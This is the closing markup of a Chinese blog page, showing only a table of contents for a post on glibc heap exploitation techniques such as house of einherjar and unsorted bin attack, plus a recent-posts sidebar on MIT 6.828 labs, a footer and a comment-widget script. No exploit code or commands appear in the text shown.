class="toc-item toc-level-1"><a class="toc-link" href="#0x07-overlapping-chunks-2"><span class="toc-number">8.</span> <span class="toc-text">0x07 overlapping_chunks_2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-6"><span class="toc-number">8.1.</span> <span class="toc-text">源代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C%E5%8F%8A%E8%B0%83%E8%AF%95-5"><span class="toc-number">8.2.</span> <span class="toc-text">运行结果及调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-6"><span class="toc-number">8.3.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-unsorted-bin-attack"><span class="toc-number">9.</span> <span class="toc-text">0x08 unsorted bin attack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-7"><span class="toc-number">9.1.</span> <span class="toc-text">源代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C%E5%8F%8A%E8%B0%83%E8%AF%95-6"><span class="toc-number">9.2.</span> <span class="toc-text">运行结果及调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-7"><span class="toc-number">9.3.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-unsorted-bin-into-stack"><span class="toc-number">10.</span> <span class="toc-text">0x08 unsorted bin into stack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-8"><span class="toc-number">10.1.</span> <span class="toc-text">源代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C%E5%8F%8A%E8%B0%83%E8%AF%95-7"><span class="toc-number">10.2.</span> <span class="toc-text">运行结果及调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-8"><span class="toc-number">10.3.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x09-large-bin-attack"><span class="toc-number">11.</span> <span class="toc-text">0x09 large bin attack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-9"><span class="toc-number">11.1.</span> <span class="toc-text">源代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C%E5%8F%8A%E8%B0%83%E8%AF%95-8"><span class="toc-number">11.2.</span> <span class="toc-text">运行结果及调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-9"><span class="toc-number">11.3.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x10-poison-null-bytes"><span class="toc-number">12.</span> <span class="toc-text">0x10 poison null bytes</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-10"><span class="toc-number">12.1.</span> <span class="toc-text">源代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C%E5%8F%8A%E8%B0%83%E8%AF%95-9"><span class="toc-number">12.2.</span> <span class="toc-text">运行结果及调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-10"><span class="toc-number">12.3.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x11-house-of-einherjar"><span class="toc-number">13.</span> <span class="toc-text">0x11 house of einherjar</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-11"><span class="toc-number">13.1.</span> <span class="toc-text">源代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C%E5%8F%8A%E8%B0%83%E8%AF%95-10"><span class="toc-number">13.2.</span> <span class="toc-text">运行结果及调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-11"><span class="toc-number">13.3.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x12-house-of-lore"><span class="toc-number">14.</span> <span class="toc-text">0x12 house of lore</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-12"><span class="toc-number">14.1.</span> <span class="toc-text">源代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C%E5%8F%8A%E8%B0%83%E8%AF%95-11"><span class="toc-number">14.2.</span> <span class="toc-text">运行结果及调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-12"><span class="toc-number">14.3.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x13-house-of-force"><span class="toc-number">15.</span> <span class="toc-text">0x13 house of force</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-13"><span class="toc-number">15.1.</span> <span class="toc-text">源代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C%E5%8F%8A%E8%B0%83%E8%AF%95-12"><span class="toc-number">15.2.</span> <span class="toc-text">运行结果及调试</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x14-house-of-orange"><span class="toc-number">16.</span> <span class="toc-text">0x14 house of orange</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-14"><span class="toc-number">16.1.</span> <span class="toc-text">源代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C%E5%8F%8A%E8%B0%83%E8%AF%95-13"><span class="toc-number">16.2.</span> <span class="toc-text">运行结果及调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-13"><span class="toc-number">16.3.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2099/01/01/test/" title="这是标题"><img src="https://i.loli.net/2021/01/22/QJ1bzWyEp9IKx7R.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="这是标题"/></a><div class="content"><a class="title" href="/2099/01/01/test/" title="这是标题">这是标题</a><time datetime="2098-12-31T16:00:00.000Z" title="发表于 2099-01-01 00:00:00">2099-01-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/24/%E3%80%90MIT6.828%E3%80%91JOS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20Lab5/" title="【MIT 6.828】JOS学习笔记 Lab5"><img src="https://i.loli.net/2021/01/23/jvHCWeyMJIhQn2f.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【MIT 6.828】JOS学习笔记 Lab5"/></a><div class="content"><a class="title" href="/2021/08/24/%E3%80%90MIT6.828%E3%80%91JOS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20Lab5/" title="【MIT 6.828】JOS学习笔记 Lab5">【MIT 6.828】JOS学习笔记 Lab5</a><time datetime="2021-08-24T11:49:31.377Z" title="发表于 2021-08-24 19:49:31">2021-08-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/08/%E3%80%90MIT6.828%E3%80%91JOS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20Lab4/" title="【MIT 6.828】JOS学习笔记 Lab4"><img src="https://i.loli.net/2021/01/23/jvHCWeyMJIhQn2f.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【MIT 6.828】JOS学习笔记 Lab4"/></a><div class="content"><a class="title" href="/2021/08/08/%E3%80%90MIT6.828%E3%80%91JOS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20Lab4/" title="【MIT 6.828】JOS学习笔记 Lab4">【MIT 6.828】JOS学习笔记 Lab4</a><time datetime="2021-08-08T14:12:16.641Z" title="发表于 2021-08-08 22:12:16">2021-08-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/06/%E3%80%90MIT6.828%E3%80%91Lab3-Exercise9/" title="【MIT 6.828】Lab3-Exercise9"><img src="https://i.loli.net/2021/01/23/jvHCWeyMJIhQn2f.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【MIT 6.828】Lab3-Exercise9"/></a><div class="content"><a class="title" href="/2021/08/06/%E3%80%90MIT6.828%E3%80%91Lab3-Exercise9/" title="【MIT 6.828】Lab3-Exercise9">【MIT 6.828】Lab3-Exercise9</a><time datetime="2021-08-06T15:31:41.615Z" title="发表于 2021-08-06 23:31:41">2021-08-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/06/%E3%80%90MIT6.828%E3%80%91Lab3-Exercise7/" title="【MIT 6.828】Lab3-Exercise7"><img src="https://i.loli.net/2021/01/23/jvHCWeyMJIhQn2f.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【MIT 6.828】Lab3-Exercise7"/></a><div class="content"><a class="title" href="/2021/08/06/%E3%80%90MIT6.828%E3%80%91Lab3-Exercise7/" title="【MIT 6.828】Lab3-Exercise7">【MIT 6.828】Lab3-Exercise7</a><time datetime="2021-08-06T08:07:46.281Z" title="发表于 2021-08-06 16:07:46">2021-08-06</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By C7</div><div class="footer_custom_text"><p><a style="margin-inline:5px" target="_blank" href="https://hexo.io/"><img src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&logo=hexo" title="博客框架为Hexo"></a><a style="margin-inline:5px" target="_blank" href="https://butterfly.js.org/"><img src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&logo=bitdefender" title="主题采用butterfly"></a><a style="margin-inline:5px" target="_blank" href="https://www.jsdelivr.com/"><img src="https://img.shields.io/badge/CDN-jsDelivr-orange?style=flat&logo=jsDelivr" title="本站使用JsDelivr为静态资源提供CDN加速"></a><a style="margin-inline:5px" target="_blank" href="https://vercel.com/ "><img src="https://img.shields.io/badge/Hosted-Vervel-brightgreen?style=flat&logo=Vercel" title="本站采用双线部署，默认线路托管于Vercel"></a><a style="margin-inline:5px" target="_blank" href="https://vercel.com/ "><img src="https://img.shields.io/badge/Hosted-Coding-0cedbe?style=flat&logo=Codio" title="本站采用双线部署，联通线路托管于Coding"></a><a style="margin-inline:5px" target="_blank" href="https://github.com/"><img src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&logo=GitHub" title="本站项目由Gtihub托管"></a><a style="margin-inline:5px" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&logo=Claris" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"></a></p></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    let initData = {
      el: '#vcomment',
      appId: '',
      appKey: '',
      placeholder: 'Please leave your footprints',
      avatar: 'monsterid',
      meta: 'nick,mail,link'.split(','),
      pageSize: '10',
      lang: 'en',
      recordIP: false,
      serverURLs: '',
      emojiCDN: '',
      emojiMaps: "",
      enableQQ: false,
      path: window.location.pathname,
    }

    if (true) { 
      initData.requiredFields= ('nick,mail'.split(','))
    }
    
    if (false) {
      const otherData = false
      initData = Object.assign(initData, otherData)
    }
    
    const valine = new Valine(initData)
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><script src="/js/unbanner.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vue@2.6.11"></script><script src="/clock/js/clock.js"></script><script async src="//at.alicdn.com/t/font_2264842_3izu8i5eoc2.js"></script><script async src="/js/xktool.js"></script><script async src="/js/fish.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>